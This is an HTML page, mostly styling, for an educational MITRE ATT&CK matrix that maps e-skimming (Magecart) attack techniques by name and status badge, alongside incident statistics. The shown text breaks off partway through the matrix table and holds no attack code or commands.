<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>MITRE ATT&CK Matrix - E-Skimming Attacks</title>
    <style>
      @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap');

      :root {
        --bg-primary: #0a0e27;
        --bg-secondary: #121733;
        --bg-tertiary: #1a1f3a;
        --bg-card: #1e2440;
        --bg-hover: #252b4a;

        --text-primary: #ffffff;
        --text-secondary: #b8c5db;
        --text-muted: #8b9dc3;

        --accent-red: #ff6b6b;
        --accent-orange: #ff922b;
        --accent-green: #51cf66;
        --accent-blue: #748ffc;
        --accent-purple: #b197fc;
        --accent-pink: #e64980;
        --accent-yellow: #ffd43b;
        --accent-brown: #8b5a2b;

        --border-color: #2a3f5f;
        --shadow-sm: 0 2px 4px rgba(0, 0, 0, 0.2);
        --shadow-md: 0 4px 12px rgba(0, 0, 0, 0.3);
        --shadow-lg: 0 8px 24px rgba(0, 0, 0, 0.4);

        --gradient-1: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        --gradient-2: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
        --gradient-3: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
        --gradient-4: linear-gradient(135deg, #43e97b 0%, #38f9d7 100%);
      }

      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      html {
        scroll-behavior: smooth;
      }

      body {
        font-family:
          'Inter',
          -apple-system,
          BlinkMacSystemFont,
          sans-serif;
        background: var(--bg-primary);
        color: var(--text-secondary);
        line-height: 1.6;
        overflow-x: hidden;
      }

      /* Background Animation */
      body::before {
        content: '';
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background:
          radial-gradient(circle at 20% 50%, rgba(102, 126, 234, 0.1) 0%, transparent 50%),
          radial-gradient(circle at 80% 80%, rgba(245, 87, 108, 0.1) 0%, transparent 50%),
          radial-gradient(circle at 40% 90%, rgba(67, 233, 123, 0.1) 0%, transparent 50%);
        pointer-events: none;
        z-index: -1;
        animation: gradientShift 20s ease infinite;
      }

      @keyframes gradientShift {
        0%,
        100% {
          opacity: 1;
        }
        50% {
          opacity: 0.8;
        }
      }

      /* Header */
      header {
        position: sticky;
        top: 0;
        z-index: 1000;
        background: rgba(18, 23, 51, 0.95);
        backdrop-filter: blur(20px);
        border-bottom: 1px solid var(--border-color);
        box-shadow: var(--shadow-md);
      }

      .header-content {
        max-width: 1400px;
        margin: 0 auto;
        padding: 24px 40px;
      }

      .header-top {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 16px;
      }

      h1 {
        font-size: 32px;
        font-weight: 800;
        background: linear-gradient(135deg, var(--accent-red) 0%, var(--accent-orange) 100%);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
        letter-spacing: -0.5px;
      }

      .version-badge {
        display: inline-block;
        padding: 6px 14px;
        background: rgba(255, 107, 107, 0.15);
        border: 1px solid var(--accent-red);
        border-radius: 20px;
        font-size: 13px;
        font-weight: 600;
        color: var(--accent-red);
      }

      .subtitle {
        font-size: 16px;
        color: var(--text-muted);
        margin-bottom: 20px;
      }

      /* Navigation */
      nav {
        display: flex;
        gap: 8px;
        flex-wrap: wrap;
      }

      .nav-btn {
        padding: 10px 20px;
        background: var(--bg-card);
        border: 1px solid var(--border-color);
        border-radius: 8px;
        color: var(--text-secondary);
        font-size: 14px;
        font-weight: 500;
        cursor: pointer;
        transition: all 0.3s ease;
        text-decoration: none;
      }

      .nav-btn:hover {
        background: var(--bg-hover);
        border-color: var(--accent-blue);
        color: var(--text-primary);
        transform: translateY(-2px);
        box-shadow: var(--shadow-sm);
      }

      .nav-btn.active {
        background: var(--accent-blue);
        border-color: var(--accent-blue);
        color: var(--text-primary);
      }

      .back-btn {
        background: var(--accent-green) !important;
        border-color: var(--accent-green) !important;
        color: var(--text-primary) !important;
        font-weight: 600;
      }

      .back-btn:hover {
        background: #45a049 !important;
        border-color: #45a049 !important;
        color: var(--text-primary) !important;
      }

      /* Container */
      .container {
        max-width: 1400px;
        margin: 0 auto;
        padding: 40px;
      }

      /* Hero Section */
      .hero {
        text-align: center;
        padding: 60px 40px;
        background: linear-gradient(
          135deg,
          rgba(102, 126, 234, 0.1) 0%,
          rgba(118, 75, 162, 0.1) 100%
        );
        border-radius: 16px;
        margin-bottom: 60px;
        border: 1px solid var(--border-color);
      }

      .hero h2 {
        font-size: 42px;
        font-weight: 800;
        color: var(--text-primary);
        margin-bottom: 20px;
        letter-spacing: -1px;
      }

      .hero p {
        font-size: 18px;
        max-width: 800px;
        margin: 0 auto 30px;
        color: var(--text-secondary);
      }

      .attack-flow {
        display: flex;
        justify-content: center;
        align-items: center;
        gap: 16px;
        flex-wrap: wrap;
        margin-top: 40px;
      }

      .flow-step {
        padding: 16px 28px;
        background: var(--bg-card);
        border: 2px solid var(--accent-red);
        border-radius: 12px;
        font-weight: 600;
        color: var(--text-primary);
        font-size: 15px;
        position: relative;
        animation: pulse 2s ease-in-out infinite;
      }

      .flow-step:not(:last-child)::after {
        content: '‚Üí';
        position: absolute;
        right: -26px;
        color: var(--accent-red);
        font-size: 24px;
        font-weight: bold;
      }

      @keyframes pulse {
        0%,
        100% {
          transform: scale(1);
        }
        50% {
          transform: scale(1.02);
        }
      }

      /* Section */
      section {
        margin-bottom: 80px;
        scroll-margin-top: 100px;
      }

      .section-header {
        display: flex;
        align-items: center;
        gap: 16px;
        margin-bottom: 30px;
        padding-bottom: 16px;
        border-bottom: 2px solid var(--border-color);
      }

      .section-icon {
        width: 48px;
        height: 48px;
        background: var(--gradient-1);
        border-radius: 12px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 24px;
      }

      h2 {
        font-size: 32px;
        font-weight: 700;
        color: var(--text-primary);
      }

      h3 {
        font-size: 24px;
        font-weight: 600;
        color: var(--text-primary);
        margin: 40px 0 20px;
      }

      h4 {
        font-size: 20px;
        font-weight: 600;
        color: var(--text-primary);
        margin: 30px 0 16px;
      }

      /* Cards */
      .card-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
        gap: 24px;
        margin: 30px 0;
      }

      .card {
        background: var(--bg-card);
        border: 1px solid var(--border-color);
        border-radius: 12px;
        padding: 28px;
        transition: all 0.3s ease;
        position: relative;
        overflow: hidden;
      }

      .card::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 4px;
        background: var(--gradient-1);
        transform: scaleX(0);
        transition: transform 0.3s ease;
      }

      .card:hover {
        transform: translateY(-4px);
        box-shadow: var(--shadow-lg);
        border-color: var(--accent-blue);
      }

      .card:hover::before {
        transform: scaleX(1);
      }

      .card-header {
        display: flex;
        align-items: center;
        gap: 12px;
        margin-bottom: 16px;
      }

      .card-badge {
        display: inline-block;
        padding: 4px 12px;
        border-radius: 6px;
        font-size: 12px;
        font-weight: 600;
        font-family: 'JetBrains Mono', monospace;
      }

      .badge-tactic {
        background: rgba(255, 107, 107, 0.2);
        color: var(--accent-red);
        border: 1px solid var(--accent-red);
      }

      .badge-technique {
        background: rgba(255, 146, 43, 0.2);
        color: var(--accent-orange);
        border: 1px solid var(--accent-orange);
      }

      .badge-defense {
        background: rgba(81, 207, 102, 0.2);
        color: var(--accent-green);
        border: 1px solid var(--accent-green);
      }

      .card-title {
        font-size: 18px;
        font-weight: 600;
        color: var(--text-primary);
        margin-bottom: 12px;
      }

      .card-description {
        color: var(--text-secondary);
        margin-bottom: 16px;
        line-height: 1.7;
      }

      .card-meta {
        display: flex;
        flex-direction: column;
        gap: 8px;
        margin-top: 16px;
        padding-top: 16px;
        border-top: 1px solid var(--border-color);
      }

      .meta-item {
        display: flex;
        align-items: flex-start;
        gap: 8px;
        font-size: 14px;
      }

      .meta-label {
        font-weight: 600;
        color: var(--accent-blue);
        min-width: 80px;
      }

      .meta-value {
        color: var(--text-secondary);
      }

      /* Code Blocks */
      pre {
        background: var(--bg-secondary);
        border: 1px solid var(--border-color);
        border-radius: 8px;
        padding: 20px;
        overflow-x: auto;
        margin: 20px 0;
        font-family: 'JetBrains Mono', monospace;
        font-size: 14px;
        line-height: 1.6;
      }

      code {
        font-family: 'JetBrains Mono', monospace;
        background: var(--bg-secondary);
        padding: 2px 8px;
        border-radius: 4px;
        font-size: 13px;
        color: var(--accent-orange);
      }

      pre code {
        background: none;
        padding: 0;
      }

      /* Lists */
      ul,
      ol {
        margin: 16px 0;
        padding-left: 24px;
      }

      li {
        margin: 8px 0;
        color: var(--text-secondary);
      }

      li strong {
        color: var(--text-primary);
      }

      /* Tables */
      .table-wrapper {
        overflow-x: auto;
        margin: 30px 0;
        border-radius: 8px;
        border: 1px solid var(--border-color);
      }

      table {
        width: 100%;
        border-collapse: collapse;
        background: var(--bg-card);
      }

      thead {
        background: var(--bg-secondary);
      }

      th {
        padding: 16px;
        text-align: left;
        font-weight: 600;
        color: var(--text-primary);
        border-bottom: 2px solid var(--border-color);
      }

      td {
        padding: 16px;
        border-bottom: 1px solid var(--border-color);
        color: var(--text-secondary);
      }

      tr:hover {
        background: var(--bg-hover);
      }

      /* MITRE ATT&CK Matrix Styles */
      .matrix-container {
        margin: 30px 0;
        border-radius: 8px;
        border: 1px solid var(--border-color);
        background: var(--bg-card);
        overflow: hidden;
      }

      .matrix-scroll {
        overflow-x: auto;
        overflow-y: visible;
        max-width: 100%;
      }

      .attack-matrix {
        min-width: 1800px;
        border-collapse: collapse;
        background: var(--bg-card);
      }

      .attack-matrix .tactic-header {
        background: var(--bg-secondary);
        padding: 16px 12px;
        text-align: center;
        font-weight: 700;
        font-size: 14px;
        color: var(--text-primary);
        border: 1px solid var(--border-color);
        white-space: nowrap;
        min-width: 150px;
      }

      .attack-matrix .technique-count {
        background: var(--bg-tertiary);
      }

      .attack-matrix .technique-count td {
        padding: 8px 12px;
        text-align: center;
        font-size: 12px;
        font-weight: 600;
        color: var(--text-muted);
        border: 1px solid var(--border-color);
        background: var(--bg-tertiary);
      }

      .attack-matrix .tactic-cell {
        padding: 12px;
        border: 1px solid var(--border-color);
        vertical-align: top;
        background: var(--bg-card);
        min-width: 150px;
      }

      .technique-item {
        margin-bottom: 12px;
        padding: 8px;
        background: rgba(116, 143, 252, 0.05);
        border-radius: 6px;
        border-left: 3px solid var(--accent-blue);
      }

      .technique-item:last-child {
        margin-bottom: 0;
      }

      .technique-link {
        display: inline-block;
        font-family: 'JetBrains Mono', monospace;
        font-size: 12px;
        font-weight: 600;
        color: var(--accent-orange);
        text-decoration: none;
        margin-right: 8px;
        padding: 2px 6px;
        background: rgba(255, 146, 43, 0.1);
        border-radius: 4px;
        border: 1px solid var(--accent-orange);
      }

      .technique-link:hover {
        background: rgba(255, 146, 43, 0.2);
        color: var(--text-primary);
      }

      .technique-name {
        display: block;
        font-size: 13px;
        font-weight: 500;
        color: var(--text-primary);
        margin-top: 4px;
        line-height: 1.4;
      }

      .sub-techniques {
        margin-top: 8px;
        padding-left: 16px;
        border-left: 2px solid var(--border-color);
      }

      .sub-technique {
        margin-bottom: 6px;
        padding: 4px 8px;
        background: rgba(81, 207, 102, 0.05);
        border-radius: 4px;
        border-left: 2px solid var(--accent-green);
      }

      .sub-technique:last-child {
        margin-bottom: 0;
      }

      .sub-technique-link {
        font-family: 'JetBrains Mono', monospace;
        font-size: 11px;
        font-weight: 600;
        color: var(--accent-green);
        text-decoration: none;
        margin-right: 6px;
        padding: 1px 4px;
        background: rgba(81, 207, 102, 0.1);
        border-radius: 3px;
        border: 1px solid var(--accent-green);
      }

      .sub-technique-link:hover {
        background: rgba(81, 207, 102, 0.2);
        color: var(--text-primary);
      }

      .sub-technique-name {
        display: block;
        font-size: 12px;
        font-weight: 400;
        color: var(--text-secondary);
        margin-top: 2px;
        line-height: 1.3;
      }

      .no-techniques {
        padding: 20px;
        text-align: center;
        color: var(--text-muted);
        font-style: italic;
        font-size: 13px;
        background: rgba(139, 157, 195, 0.05);
        border-radius: 6px;
        border: 1px dashed var(--border-color);
      }

      /* Status Badges for Annotation System */
      .status-badge {
        display: inline-block;
        font-size: 10px;
        padding: 2px 6px;
        border-radius: 3px;
        font-weight: 600;
        margin-left: 4px;
        vertical-align: middle;
      }

      .status-badge.observed {
        background: #ff6b6b;
        color: white;
      }

      .status-badge.emerging {
        background: #ffd43b;
        color: #000;
      }

      .status-badge.lab {
        background: #748ffc;
        color: white;
      }

      /* Enhanced technique items */
      .technique-item .status-badge {
        margin-left: 6px;
      }

      /* Alert Boxes */
      .alert {
        padding: 20px 24px;
        border-radius: 8px;
        margin: 24px 0;
        border-left: 4px solid;
      }

      .alert-info {
        background: rgba(116, 143, 252, 0.1);
        border-color: var(--accent-blue);
        color: var(--text-secondary);
      }

      .alert-warning {
        background: rgba(255, 212, 59, 0.1);
        border-color: var(--accent-yellow);
        color: var(--text-secondary);
      }

      .alert-danger {
        background: rgba(255, 107, 107, 0.1);
        border-color: var(--accent-red);
        color: var(--text-secondary);
      }

      .alert-success {
        background: rgba(81, 207, 102, 0.1);
        border-color: var(--accent-green);
        color: var(--text-secondary);
      }

      /* Stats Grid */
      .stats-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
        gap: 20px;
        margin: 30px 0;
      }

      .stat-card {
        background: var(--bg-card);
        border: 1px solid var(--border-color);
        border-radius: 12px;
        padding: 24px;
        text-align: center;
        transition: all 0.3s ease;
      }

      .stat-card:hover {
        transform: translateY(-4px);
        box-shadow: var(--shadow-md);
      }

      .stat-number {
        font-size: 36px;
        font-weight: 800;
        background: var(--gradient-1);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
        margin-bottom: 8px;
      }

      .stat-label {
        font-size: 14px;
        color: var(--text-muted);
        font-weight: 500;
      }

      /* Timeline */
      .timeline {
        position: relative;
        padding-left: 40px;
        margin: 40px 0;
      }

      .timeline::before {
        content: '';
        position: absolute;
        left: 0;
        top: 0;
        bottom: 0;
        width: 2px;
        background: var(--gradient-1);
      }

      .timeline-item {
        position: relative;
        margin-bottom: 40px;
        padding-left: 30px;
      }

      .timeline-item::before {
        content: '';
        position: absolute;
        left: -46px;
        top: 0;
        width: 16px;
        height: 16px;
        background: var(--accent-red);
        border: 3px solid var(--bg-primary);
        border-radius: 50%;
      }

      .timeline-title {
        font-size: 18px;
        font-weight: 600;
        color: var(--text-primary);
        margin-bottom: 8px;
      }

      .timeline-content {
        color: var(--text-secondary);
      }

      /* Scroll to Top */
      .scroll-top {
        position: fixed;
        bottom: 40px;
        right: 40px;
        width: 50px;
        height: 50px;
        background: var(--gradient-1);
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        opacity: 0;
        transition: all 0.3s ease;
        box-shadow: var(--shadow-lg);
        z-index: 999;
      }

      .scroll-top.visible {
        opacity: 1;
      }

      .scroll-top:hover {
        transform: translateY(-4px);
      }

      .scroll-top::after {
        content: '‚Üë';
        font-size: 24px;
        color: white;
        font-weight: bold;
      }

      /* Footer */
      footer {
        background: var(--bg-secondary);
        border-top: 1px solid var(--border-color);
        padding: 40px;
        text-align: center;
        margin-top: 80px;
      }

      footer p {
        color: var(--text-muted);
        font-size: 14px;
      }

      /* Responsive */
      @media (max-width: 768px) {
        .container {
          padding: 20px;
        }

        h1 {
          font-size: 24px;
        }

        .hero h2 {
          font-size: 32px;
        }

        .card-grid {
          grid-template-columns: 1fr;
        }

        .flow-step:not(:last-child)::after {
          content: '‚Üì';
          position: static;
          display: block;
          margin: 8px 0;
        }

        .attack-flow {
          flex-direction: column;
        }

        nav {
          justify-content: center;
        }

        /* Matrix responsive styles */
        .matrix-container {
          margin: 20px 0;
          border-radius: 6px;
        }

        .attack-matrix .tactic-header {
          padding: 12px 8px;
          font-size: 12px;
          min-width: 120px;
        }

        .attack-matrix .tactic-cell {
          padding: 8px;
          min-width: 120px;
        }

        .technique-item {
          margin-bottom: 8px;
          padding: 6px;
        }

        .technique-link {
          font-size: 11px;
          padding: 1px 4px;
        }

        .technique-name {
          font-size: 12px;
        }

        .sub-technique {
          padding: 3px 6px;
        }

        .sub-technique-link {
          font-size: 10px;
          padding: 1px 3px;
        }

        .sub-technique-name {
          font-size: 11px;
        }

        .no-techniques {
          padding: 15px;
          font-size: 12px;
        }
      }

      /* Animations */
      @keyframes fadeInUp {
        from {
          opacity: 0;
          transform: translateY(30px);
        }
        to {
          opacity: 1;
          transform: translateY(0);
        }
      }

      .fade-in-up {
        animation: fadeInUp 0.6s ease-out;
      }

      /* Expandable Sections */
      .expandable {
        margin: 20px 0;
      }

      .expandable-header {
        background: var(--bg-card);
        border: 1px solid var(--border-color);
        border-radius: 8px;
        padding: 16px 20px;
        cursor: pointer;
        display: flex;
        justify-content: space-between;
        align-items: center;
        transition: all 0.3s ease;
      }

      .expandable-header:hover {
        background: var(--bg-hover);
      }

      .expandable-header h4 {
        margin: 0;
      }

      .expand-icon {
        transition: transform 0.3s ease;
      }

      .expandable.open .expand-icon {
        transform: rotate(180deg);
      }

      .expandable-content {
        max-height: 0;
        overflow: hidden;
        transition: max-height 0.3s ease;
      }

      .expandable.open .expandable-content {
        max-height: 2000px;
      }

      .expandable-body {
        padding: 20px;
        background: var(--bg-secondary);
        border: 1px solid var(--border-color);
        border-top: none;
        border-radius: 0 0 8px 8px;
      }
    </style>
  </head>
  <body>
    <header>
      <div class="header-content">
        <div class="header-top">
          <h1>MITRE ATT&CK Matrix for E-Skimming</h1>
          <span class="version-badge">v1.0</span>
        </div>
        <p class="subtitle">
          Comprehensive framework for understanding, detecting, and defending against e-skimming
          attacks
        </p>
        <nav>
          <a href="#" id="back-btn" class="nav-btn back-btn">‚Üê Back to Labs</a>
          <a href="#overview" class="nav-btn">Overview</a>
          <a href="#tactics" class="nav-btn">Tactics & Techniques</a>
          <a href="#detection" class="nav-btn">Detection</a>
          <a href="#defense" class="nav-btn">Defense</a>
          <a href="#case-studies" class="nav-btn">Case Studies</a>
          <a href="#iocs" class="nav-btn">IOCs</a>
        </nav>
      </div>
    </header>

    <div class="container">
      <!-- Hero Section -->
      <div class="hero fade-in-up">
        <h2>Understanding E-Skimming Attack Patterns</h2>
        <p>
          E-skimming attacks have caused billions in damages and affected millions of customers
          worldwide. This framework provides comprehensive analysis of attack techniques, tactics,
          and procedures used by threat actors to compromise e-commerce platforms.
        </p>

        <div class="attack-flow">
          <div class="flow-step">Initial Access</div>
          <div class="flow-step">Execution</div>
          <div class="flow-step">Persistence</div>
          <div class="flow-step">Defense Evasion</div>
          <div class="flow-step">Collection</div>
          <div class="flow-step">Exfiltration</div>
          <div class="flow-step">Impact</div>
        </div>
      </div>

      <!-- Stats -->
      <div class="stats-grid fade-in-up">
        <div class="stat-card">
          <div class="stat-number">380K</div>
          <div class="stat-label">British Airways Victims</div>
        </div>
        <div class="stat-card">
          <div class="stat-number">¬£20M</div>
          <div class="stat-label">ICO Fine (British Airways)</div>
        </div>
        <div class="stat-card">
          <div class="stat-number">11K+</div>
          <div class="stat-label">Sites Compromised (CosmicSting)</div>
        </div>
        <div class="stat-card">
          <div class="stat-number">13+</div>
          <div class="stat-label">Magecart Groups Active</div>
        </div>
      </div>

      <!-- Overview Section -->
      <section id="overview">
        <div class="section-header">
          <div class="section-icon">üìä</div>
          <h2>Overview</h2>
        </div>

        <div class="alert alert-info">
          <strong>Document Information</strong><br />
          Version 2.0 | Last Updated: 2025-10-21<br />
          Target Environment: Web applications, e-commerce platforms, payment processing systems<br />
          <strong>Updates:</strong> Added 33 new techniques including GTM hijacking, NPM supply
          chain attacks, steganography, and annotation system
        </div>

        <p style="font-size: 18px; line-height: 1.8; margin: 30px 0">
          This document presents a customized MITRE ATT&CK matrix specifically designed for
          e-skimming (web skimming, formjacking, Magecart) attacks. Based on extensive research and
          analysis of real-world e-skimming campaigns, this matrix maps attack techniques, tactics,
          and procedures (TTPs) used by threat actors to compromise e-commerce platforms and steal
          payment card data.
        </p>

        <!-- MITRE ATT&CK Matrix Table -->
        <div class="section-header" style="margin-top: 60px">
          <div class="section-icon">üéØ</div>
          <h2>MITRE ATT&CK Matrix for E-Skimming</h2>
        </div>

        <div class="alert alert-info">
          <strong>Annotation System:</strong> Techniques are marked with status badges to indicate
          their prevalence:<br />
          <span class="status-badge observed">üî¥ Observed</span> = Documented in real-world attacks
          with published IOCs or incident reports<br />
          <span class="status-badge emerging">üü° Emerging</span> = Security research, PoCs, or
          logical evolution of existing techniques<br />
          <span class="status-badge lab">üîµ Lab-Only</span> = Demonstrated in controlled lab
          environments for educational purposes
        </div>

        <div class="matrix-container">
          <div class="matrix-scroll">
            <table class="attack-matrix">
              <thead>
                <tr>
                  <th class="tactic-header">Initial Access</th>
                  <th class="tactic-header">Execution</th>
                  <th class="tactic-header">Persistence</th>
                  <th class="tactic-header">Privilege Escalation</th>
                  <th class="tactic-header">Defense Evasion</th>
                  <th class="tactic-header">Credential Access</th>
                  <th class="tactic-header">Discovery</th>
                  <th class="tactic-header">Lateral Movement</th>
                  <th class="tactic-header">Collection</th>
                  <th class="tactic-header">Command and Control</th>
                  <th class="tactic-header">Exfiltration</th>
                  <th class="tactic-header">Impact</th>
                </tr>
                <tr class="technique-count">
                  <td>4 techniques</td>
                  <td>1 technique</td>
                  <td>4 techniques</td>
                  <td>3 techniques</td>
                  <td>9 techniques</td>
                  <td>4 techniques</td>
                  <td>6 techniques</td>
                  <td>0 techniques</td>
                  <td>5 techniques</td>
                  <td>1 technique</td>
                  <td>4 techniques</td>
                  <td>5 techniques</td>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td class="tactic-cell">
                    <div class="technique-item">
                      <a href="#t1190" class="technique-link">T1190</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Exploit Public-Facing Application</span>
                    </div>
                    <div class="technique-item">
                      <a href="#t1078" class="technique-link">T1078</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Valid Accounts</span>
                    </div>
                    <div class="technique-item">
                      <a href="#t1195" class="technique-link">T1195</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Supply Chain Compromise</span>
                      <div class="sub-techniques">
                        <div class="sub-technique">
                          <a href="#t1195-002" class="sub-technique-link">T1195.002</a>
                          <span class="status-badge observed">üî¥ Observed</span>
                          <span class="sub-technique-name"
                            >Compromise Software Dependencies (NPM Sept 2025)</span
                          >
                        </div>
                      </div>
                    </div>
                    <div class="technique-item">
                      <a href="#custom-gtm" class="technique-link">CUSTOM</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Google Tag Manager Hijacking</span>
                    </div>
                  </td>
                  <td class="tactic-cell">
                    <div class="technique-item">
                      <a href="#t1059-007" class="technique-link">T1059.007</a>
                      <span class="technique-name">JavaScript Execution</span>
                    </div>
                  </td>
                  <td class="tactic-cell">
                    <div class="technique-item">
                      <a href="#t1554" class="technique-link">T1554</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Compromise Client Software</span>
                    </div>
                    <div class="technique-item">
                      <a href="#t1176" class="technique-link">T1176</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Browser Extensions</span>
                    </div>
                    <div class="technique-item">
                      <a href="#custom-gtm-persist" class="technique-link">CUSTOM</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">GTM Container Poisoning</span>
                    </div>
                    <div class="technique-item">
                      <a href="#custom-service-worker" class="technique-link">CUSTOM</a>
                      <span class="status-badge emerging">üü° Emerging</span>
                      <span class="technique-name">Service Worker Man-in-the-Middle</span>
                    </div>
                  </td>
                  <td class="tactic-cell">
                    <div class="technique-item">
                      <a href="#t1068" class="technique-link">T1068</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Exploitation for Privilege Escalation</span>
                    </div>
                    <div class="technique-item">
                      <a href="#t1548-002" class="technique-link">T1548.002</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Bypass UAC / Weak Admin Auth</span>
                    </div>
                    <div class="technique-item">
                      <a href="#custom-role-escalation" class="technique-link">CUSTOM</a>
                      <span class="status-badge emerging">üü° Emerging</span>
                      <span class="technique-name">Web App Role Escalation</span>
                    </div>
                  </td>
                  <td class="tactic-cell">
                    <div class="technique-item">
                      <a href="#t1027" class="technique-link">T1027</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Obfuscated Files or Information</span>
                      <div class="sub-techniques">
                        <div class="sub-technique">
                          <a href="#t1027-003" class="sub-technique-link">T1027.003</a>
                          <span class="status-badge observed">üî¥ Observed</span>
                          <span class="sub-technique-name"
                            >Steganography (CSS, EXIF, PNG, Favicon)</span
                          >
                        </div>
                      </div>
                    </div>
                    <div class="technique-item">
                      <a href="#t1622" class="technique-link">T1622</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Debugger Evasion</span>
                    </div>
                    <div class="technique-item">
                      <a href="#t1480" class="technique-link">T1480</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Execution Guardrails</span>
                      <div class="sub-techniques">
                        <div class="sub-technique">
                          <a href="#t1480-001" class="sub-technique-link">T1480.001</a>
                          <span class="status-badge observed">üî¥ Observed</span>
                          <span class="sub-technique-name">Geofencing</span>
                        </div>
                      </div>
                    </div>
                    <div class="technique-item">
                      <a href="#t1036" class="technique-link">T1036</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Masquerading</span>
                    </div>
                    <div class="technique-item">
                      <a href="#t1497-001" class="technique-link">T1497.001</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">VM/Sandbox Evasion (WebGL)</span>
                    </div>
                    <div class="technique-item">
                      <a href="#custom-canvas-fp" class="technique-link">CUSTOM</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Canvas Fingerprinting Evasion</span>
                    </div>
                    <div class="technique-item">
                      <a href="#custom-csp-bypass" class="technique-link">CUSTOM</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">CSP Bypass via Google Analytics</span>
                    </div>
                    <div class="technique-item">
                      <a href="#custom-timing-evasion" class="technique-link">CUSTOM</a>
                      <span class="status-badge emerging">üü° Emerging</span>
                      <span class="technique-name">Timing-Based Evasion</span>
                    </div>
                    <div class="technique-item">
                      <a href="#custom-shadow-dom" class="technique-link">CUSTOM</a>
                      <span class="status-badge emerging">üü° Emerging</span>
                      <span class="technique-name">Shadow DOM Hiding</span>
                    </div>
                  </td>
                  <td class="tactic-cell">
                    <div class="technique-item">
                      <a href="#t1003" class="technique-link">T1003</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">OS Credential Dumping</span>
                    </div>
                    <div class="technique-item">
                      <a href="#t1552-001" class="technique-link">T1552.001</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Unsecured Credentials (.env files)</span>
                    </div>
                    <div class="technique-item">
                      <a href="#t1555-003" class="technique-link">T1555.003</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Browser Saved Credentials</span>
                    </div>
                    <div class="technique-item">
                      <a href="#custom-credential-api" class="technique-link">CUSTOM</a>
                      <span class="status-badge emerging">üü° Emerging</span>
                      <span class="technique-name">Credential Management API Hooking</span>
                    </div>
                  </td>
                  <td class="tactic-cell">
                    <div class="technique-item">
                      <a href="#t1083" class="technique-link">T1083</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">File and Directory Discovery</span>
                    </div>
                    <div class="technique-item">
                      <a href="#t1082" class="technique-link">T1082</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">System Info Discovery (Fingerprinting)</span>
                    </div>
                    <div class="technique-item">
                      <a href="#t1614" class="technique-link">T1614</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">System Location Discovery (Geolocation)</span>
                    </div>
                    <div class="technique-item">
                      <a href="#t1010" class="technique-link">T1010</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Application Window Discovery (DevTools)</span>
                    </div>
                    <div class="technique-item">
                      <a href="#custom-payment-form-discovery" class="technique-link">CUSTOM</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Payment Form Discovery</span>
                    </div>
                    <div class="technique-item">
                      <a href="#t1497" class="technique-link">T1497</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Virtualization/Sandbox Evasion</span>
                    </div>
                  </td>
                  <td class="tactic-cell">
                    <div class="no-techniques">
                      No techniques commonly used in e-skimming attacks
                    </div>
                  </td>
                  <td class="tactic-cell">
                    <div class="technique-item">
                      <a href="#t1056" class="technique-link">T1056</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Input Capture</span>
                      <div class="sub-techniques">
                        <div class="sub-technique">
                          <a href="#t1056-001" class="sub-technique-link">T1056.001</a>
                          <span class="status-badge observed">üî¥ Observed</span>
                          <span class="sub-technique-name">Keylogging</span>
                        </div>
                        <div class="sub-technique">
                          <a href="#t1056-002" class="sub-technique-link">T1056.002</a>
                          <span class="status-badge observed">üî¥ Observed</span>
                          <span class="sub-technique-name">GUI Input Capture</span>
                        </div>
                      </div>
                    </div>
                    <div class="technique-item">
                      <a href="#t1005" class="technique-link">T1005</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Data from Local System</span>
                    </div>
                    <div class="technique-item">
